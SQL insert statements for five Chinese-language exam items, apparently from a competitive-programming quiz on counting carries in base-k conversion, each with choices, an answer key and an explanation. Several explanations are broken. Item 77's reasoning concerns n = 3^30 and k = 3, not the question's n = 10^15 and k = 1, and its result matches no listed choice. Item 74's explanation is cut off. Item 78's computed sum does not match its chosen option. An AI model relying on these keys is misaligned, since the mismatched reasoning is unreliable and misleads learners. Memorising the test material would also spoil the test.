INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (74, '<p>若 k=1,则输出 ans时,len=n</p>', NULL, 73, '', '', '', '', '错误', '当 k=1 时，len 只会被加一次，所以 len 的值为 2，ans 的值', 1, 1, 0, 'test', '2023-11-04 21:38:50', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (75, '<p>若 k&gt;1,则输出 ans 时,len 一定大于n</p>', NULL, 73, '', '', '', '', '错误', '因为 ans 记录的是进位的次数，所以当输入的数小于 k 进制的时候，是不用进位的，ans 的值为 0，而此时 len 的值为 1', 1, 1, 0, 'test', '2023-11-04 21:39:22', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (76, '<p>若 k&gt;1,则输出 ans 时,k^len一定大于n</p>', NULL, 73, '', '', '', '', '正确', '由进制的性质可以得到，n 转化成 k 进制最高位为 k^(len-1),而 k^len 显然大于它', 1, 1, 0, 'test', '2023-11-04 21:40:58', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (77, '<p>若输入的 n 等于 10d的15次方，输入的 k 为 1,则输出等于（）</p>', NULL, 73, '(10^30-10^15)/2', '(10^30+10^15)/2', '1', '10^15', 'A', '当 n=3^30， k = 3 时，转化后的三进制一共有 31 位，最高位为 1，其它均为 0，\n第二高位要进位到最高位需要 1 次进位，第三高位进位到第二高位需要 3 次进位，第四到第三需要 9 次，一次类推，所以最后的可得总进位为：1 + 3 + 9 + ...+3^29 = 1*(1 - 3^30)/(1-3) =(3^30-1)/2，即等比数列求和公式，选 A。', 0, 1, 0, 'test', '2023-11-04 21:42:51', '', NULL, NULL);
INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (78, '<p>若输入的 100,010,002,000,090,输入的 k 为 10,则输岀等于</p>', NULL, 73, '11.112.222.444.543', '11.122.222.444.543', '11.122.222.444.453', '11.112.222.444.453', 'D', '即求十进制从 1 加到 100010002000090 需要进位多少次，进行分步处理：\n第一，加到 10^14 次方，需要(10^14-1)/9 = 1111111111111 次\n第二，加到 10^10 次方，需要(10^10-1)/9 = 111111111 次\n第三，加到 2*10^6 次方，需要 2*(10^6-1)/9 = 22222 次\n第四，加到 90，需要 9 次\n累加:1111111111111 + 111111111 + 22222 + 9 = 1111222244453 即选项 D。', 0, 1, 0, 'test', '2023-11-04 21:44:31', '', NULL, NULL);
